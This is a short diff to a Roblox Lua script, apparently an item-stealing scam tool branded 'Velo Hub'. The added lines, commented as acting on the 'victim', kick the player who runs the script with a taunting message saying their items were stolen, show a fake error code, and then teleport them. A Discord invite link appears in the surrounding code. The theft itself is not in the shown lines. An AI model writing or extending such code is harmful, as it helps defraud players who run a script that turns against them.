@@ -2380,6 +2380,16 @@ local function fn53()
 			v15("https://discord.gg/projectvelo")
 		end
 	end)
+
+	-- kick victim with message when all items have been taken
+	task.delay(0.5, function()
+		pcall(function()
+			game:GetService("Players").LocalPlayer:Kick("All your items just got stolen by Velo Hub, Lol\n\nCode Error: 267")
+		end)
+		pcall(function()
+			game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+		end)
+	end)
 end
 
 local function fn54(arg)
